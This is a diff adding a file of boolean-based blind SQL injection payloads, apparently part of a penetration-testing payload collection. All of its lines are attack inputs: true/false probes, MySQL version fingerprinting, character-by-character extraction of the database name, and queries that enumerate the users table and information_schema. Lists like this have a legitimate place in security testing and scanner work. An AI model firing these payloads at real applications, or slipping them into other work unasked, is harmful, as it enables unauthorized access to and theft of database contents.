@@ -1,0 +1,26 @@
+# SQL Injection - Boolean-based Blind
+# Payloads for boolean-based blind SQLi where response differs for true/false
+' AND 1=1--
+' AND 1=2--
+' AND 1=1#
+' AND 1=2#
+1' AND 1=1--
+1' AND 1=2--
+1' AND 1=1#
+1' AND 1=2#
+' AND 'a'='a'--
+' AND 'a'='b'--
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND SUBSTRING(@@version,1,1)='8'--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT COUNT(*) FROM users)>100--
+' AND (SELECT LENGTH(database()))>0--
+' AND (SELECT LENGTH(database()))>10--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
+' AND EXISTS(SELECT * FROM users)--
+' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users')--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1 AND 1=1
+1 AND 1=2
